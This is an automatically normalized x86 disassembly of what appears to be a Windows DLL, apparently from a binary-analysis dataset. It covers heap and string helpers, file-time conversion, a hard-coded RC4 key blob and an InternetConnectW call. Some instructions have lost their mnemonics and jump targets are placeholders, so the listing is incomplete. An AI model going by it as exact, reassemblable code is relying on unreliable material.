and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_1002d790
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f520
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x4
xor ebx ebx
push ebx
mov esi ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] r--data
jmp r-xdata
push 0x1c
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x2c ] 0x208
mov [ ebp - 0x28 ] 0x6801
mov [ ebp - 0x24 ] 0x10
mov [ ebp - 0x20 ] 0x526278b5
mov [ ebp - 0x1c ] 0xd7243e98
mov [ ebp - 0x18 ] 0x7ceec63b
mov [ ebp - 0x14 ] 0x6291edb9
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
push edi
push esi
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
call sub_10054770
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x34 ]
cmp ecx ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor eax eax
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_1002d920
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x7fffffff
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10052185
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_1002050e
lea eax [ ecx + ecx ]
push eax
call sub_1005ac7e
add esp 0x4
test eax eax
jne r-xdata
sub_1002d975
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x30
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov ecx 0xff10
cmp ax cx
jae r-xdata
movzx eax ax
sub eax 0x30
pop ebp
retn
mov edx 0xff1a
mov ecx 0x660
cmp ax cx
jb r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
lea edx [ ecx + 0xa ]
cmp ax dx
jae r-xdata
mov ecx 0x6f0
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0x966
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0xc66
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0xe50
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
add ecx 0x50
cmp ax cx
jb r-xdata
add edx 0x50
cmp ax dx
jb r-xdata
mov ecx 0x1040
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0x17e0
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
add ecx 0x30
cmp ax cx
jb r-xdata
add edx 0x30
jmp r-xdata
cmp ax dx
jb r-xdata
sub_1002db20
test ebx ebx
je r-xdata
retn
mov eax [ edi ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi ] eax
call sub_10078600
add esp 0xc
pop esi
push eax
call [ LocalFree@IAT ]
mov [ edi ] 0x0
sub_1002db5d
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000b659
int3
pop ebp
jmp eax
sub_1002db8a
push 0x38
mov eax sub_1007e7ff
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10010e0d
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_1002a730
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10045daa
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_1002dc60
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10082298
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x5c ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x30
mov esi ecx
lea ecx [ esp + 0x3c ]
push 0x0
push ecx
mov ebx edx
mov [ esp + 0x20 ] eax
mov [ esp + 0x40 ] 0x0
call sub_10078970
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x58 ]
add esp 0xc
cmp [ esi + 0x44 ] 0x0
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] eax
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
push ebx
lea ecx [ esp + 0x14 ]
push ecx
call [ FileTimeToDosDateTime@IAT ]
mov eax [ esp + 0x34 ]
and eax 0x27
xor ebx ebx
mov [ edi ] ax
cmp [ esi + 0x44 ] ebx
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
lea edx [ esp + 0x4c ]
push edx
call [ FileTimeToLocalFileTime@IAT ]
cmp [ esi + 0x4c ] ebx
je r-xdata
or eax 0x100
mov [ edi ] ax
push ebx
xor eax eax
push r--data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x34 ] 0x7
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] ax
call sub_1005e3c0
lea edx [ esp + 0x18 ]
mov ecx esi
mov [ esp + 0x78 ] ebx
call sub_1000b6d0
cmp [ esp + 0x2c ] 0x8
mov esi eax
jb r-xdata
mov edx 0x80
or [ edi ] dx
mov eax esi
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x5c ]
xor ecx esp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esp + 0x18 ]
push ecx
call sub_10065045
add esp 0x4
sub_1002dd80
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebx + 0xb8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x4
jne r-xdata
mov edx [ ebp + 0x8 ]
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
push ecx
push 0x20000005
mov [ esi ] 0x0
mov eax [ ebx + 0xdc ]
push edx
call eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax 0x64
mov esp ebp
pop ebp
retn 0x4
push 0x400
push 0x8
mov [ ebp - 0x8 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ edi ] eax
mov ecx [ esi ]
lea edx [ ebp - 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
push 0x400
add ecx eax
mov eax [ ebx + 0xe0 ]
push ecx
push edx
call eax
test eax eax
je r-xdata
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push eax
mov [ edi ] eax
mov eax [ ebx + 0xe0 ]
push edx
call eax
mov ecx [ ebp - 0x4 ]
cmp ecx [ esi ]
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
lea esp [ esp ]
mov eax 0x5
mov esp ebp
pop ebp
retn 0x4
test eax eax
jne r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0x4
mov eax 0x6
mov esp ebp
pop ebp
retn 0x4
add [ esi ] eax
mov eax [ esi ]
mov ecx [ edi ]
add eax 0x400
push eax
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
mov [ edi ] eax
add eax [ esi ]
mov edx [ ebx + 0xe0 ]
push 0x400
push eax
push ecx
call edx
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub_1002dea9
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
[ edi ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp ecx eax
ja r-xdata
test esi esi
jne r-xdata
pop edi
leave
retn
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call sub_10041157
add esp 0x10
mov edi eax
test esi esi
je r-xdata
mov [ ebp - 0x1c ] ecx
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_100036b3
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
jmp r-xdata
mov eax edi
sub_1002df60
push ebp
mov ebp esp
push 0xffffffff
push sub_10081ab0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ebx
jae r-xdata
push r--data
call sub_100616c6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
call sub_1002a4b0
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ebx
push 0x0
push edi
push eax
push ecx
push edx
mov [ ebp - 0x14 ] eax
call sub_1004c8a0
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add esp 0x18
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax * 8 ]
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
lea ecx [ edi * 8 ]
sub ecx edi
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
push ecx
lea eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ebx
call sub_100624a0
mov edx [ esi ]
push edx
call sub_10065045
add esp 0x14
sub_1002e079
mov edi edi
push ebp
mov ebp esp
mov dx [ ebp + 0xc ]
push esi
cmp [ ebp + 0x10 ] dx
ja r-xdata
cmp [ ebp + 0x14 ] dx
ja r-xdata
movzx ecx [ ebp + 0x10 ]
movzx eax dx
lea esi [ ecx + 0x9 ]
cmp eax esi
jg r-xdata
cmp [ ebp + 0x18 ] dx
ja r-xdata
movzx ecx [ ebp + 0x14 ]
movzx eax dx
lea esi [ ecx + 0x5 ]
cmp eax esi
jg r-xdata
sub eax ecx
jmp r-xdata
or eax 0xffffffff
movzx ecx [ ebp + 0x18 ]
movzx eax dx
lea edx [ ecx + 0x5 ]
cmp eax edx
jle r-xdata
sub eax ecx
add eax 0xa
jmp r-xdata
pop esi
pop ebp
retn
sub_1002e0d0
push 0x28
mov eax sub_1007e526
call sub_10050d0f
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x18
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
push ecx
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_10039ea0
jmp r-xdata
lea ecx [ eax + 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
sub_1002e160
push ebp
mov ebp esp
push 0xffffffff
push sub_1007e02b
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x18 ]
mov ecx [ ecx ]
push 0x1
push eax
mov eax [ ebp + 0x14 ]
push 0x3
push edx
mov edx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push edx
push eax
push ecx
call [ InternetConnectW@IAT ]
xor edx edx
mov esi eax
test esi esi
setne dl
push edx
call sub_1002f000
add esp 0x4
test esi esi
je r-xdata
xor eax eax
push 0x4
call sub_1005ac7e
add esp 0x4
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push esi
mov ecx eax
call sub_100216b0
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_1002e1f2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000c7f4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_1002e220
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f798
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi ]
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x58 ] 0x0
call sub_100453f0
mov [ ebp - 0x60 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x58 ]
push 0x4
push 0x0
mov [ ebp - 0x68 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x4
call sub_1000a6f0
mov ecx [ ebp - 0x58 ]
test ecx ecx
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x60 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
jmp r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ edi + 0x4 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
inc [ esi ]
mov [ ebp - 0x64 ] esi
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x0
cmp edi edx
je r-xdata
mov esi [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x58 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] esi
inc [ esi ]
jmp r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1002e360
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_100270f0
mov [ esi + 0x4 ] 0x3
cmp [ ebx + 0x84 ] 0x8
jb r-xdata
add ebx 0x70
mov ebx [ ebx + 0x70 ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_10078600
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_1002e400
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push edi
mov edi [ esi + 0x4 ]
call sub_1001b300
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
pop edi
sub_1002e430
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
movzx edx [ ecx ]
rol eax 0x8
add eax edx
add ecx 0x2
pop ebp
retn 0x8
sub_1002e450
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0xc ]
call sub_1003e714
test [ ebp + 0x8 ] ax
pop ecx
pop ecx
push 0x0
pop eax
setne al
pop ebp
retn 0x8
sub_1002e480
mov eax [ esi ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi ] 0x0
pop edi
retn
push eax
call edi
mov [ esi + 0x4 ] 0x0
sub_1002e4b0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
cmp esi [ eax + 0x8 ]
je r-xdata
mov edx eax
pop edi
mov [ edx + 0x8 ] esi
pop esi
pop ebp
retn
mov eax r--data
test esi esi
jne r-xdata
push eax
push r--data
call sub_1001f980
mov ecx [ edi + 0x8 ]
add esp 0x8
pop edi
mov [ ecx + 0x8 ] esi
pop esi
pop ebp
retn
mov eax r--data
sub_1002e4f2
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_1001a026
pop ecx
push eax
push [ ebp + 0x8 ]
mov ecx esi
call sub_10013100
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1002e530
push ebp
mov ebp esp
push 0xffffffff
push sub_1007e0eb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x20
mov [ ebp - 0x10 ] 0x0
call sub_1005ac7e
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov ecx eax
call sub_100066c0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] eax
test edi edi
je r-xdata
mov eax [ rw-data ]
mov ecx [ esi ]
push eax
push edi
push ecx
call sub_100112ed
mov edx [ esi ]
mov [ edx + 0x10 ] 0x0
mov ecx [ esi ]
add esp 0xc
push r--data
add ecx 0x18
call sub_1005daf0
push 0x0
lea ecx [ ebp + 0x8 ]
call sub_100067d1
cmp [ rw-data ] 0x0
jne r-xdata
lea ecx [ ebp + 0x8 ]
call sub_1002470e
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
sub_1002e630
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov esi [ edi ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
cmp eax ebx
jne r-xdata
cmp [ esi + 0x4 ] ebx
je r-xdata
mov edi eax
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov edi eax
mov [ esi + 0x4 ] eax
cmp edi ebx
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] ebx
jne r-xdata
xor esi esi
mov ecx [ ebp + 0x8 ]
mov [ esi ] r--data
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
call sub_10045010
mov eax [ ebp + 0x8 ]
mov [ esi + 0xc ] ebx
mov [ esi ] r--data
mov ecx [ eax + 0xc ]
mov [ esi + 0xc ] ecx
jmp r-xdata
push 0x10
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
pop ebp
retn 0x4
mov [ edi + 0x4 ] ebx
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov [ edi ] esi
cmp esi ebx
je r-xdata
sub_1002e6f0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
push edi
cmp [ ebx + 0x4 ] esi
jbe r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edi [ eax + esi * 4 ]
mov ecx [ ebp + 0xc ]
mov edx [ edi + 0x4 ]
push ecx
push edx
call sub_10028b2b
add esp 0x8
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
cmp esi [ ebx + 0x4 ]
jb r-xdata
sub_1002e730
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f7c8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_1001d440
mov eax [ edi + 0x4 ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1002e78f
